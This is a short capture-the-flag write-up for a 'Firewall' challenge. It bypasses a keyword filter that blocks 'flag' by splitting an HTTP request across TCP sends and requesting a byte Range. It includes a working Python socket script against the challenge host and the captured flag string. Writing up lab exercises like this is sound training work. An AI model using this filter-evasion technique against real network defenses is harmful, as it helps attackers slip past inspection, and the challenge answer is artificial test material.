---
created: 2026-01-11T23:08
updated: 2026-01-12T00:35
title: Firewall
solves: 500
points: 35
---

The firewall is pretty simple, the string `flag` is blocked from appearing in incoming and outgoing packets.

While the flag is located at `/flag.html`.

We can solve this by sending 2 packets instead of 1, and using `Range` header to make sure the `flag` string in `flag.html` isn't actually sent back to us.

```python
import socket
import time

HOST = "35.227.38.232"
PORT = 5000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

s.send(b"GET /f")
time.sleep(0.05)
s.send(b"lag.html HTTP/1.1\r\n")
time.sleep(0.05)
s.send(b"Host: localhost\r\n")
s.send(b"Range: bytes=135-200\r\n")
s.send(b"Connection: close\r\n\r\n\r\n")

res = b""
while True:
    data = s.recv(4096)
    res += data
    if len(data) == 0:
        break

print(res.decode())
```

```flag
uoftctf{f1rew4l1_Is_nOT_par7icu11rLy_R0bust_I_bl4m3_3bpf}
```
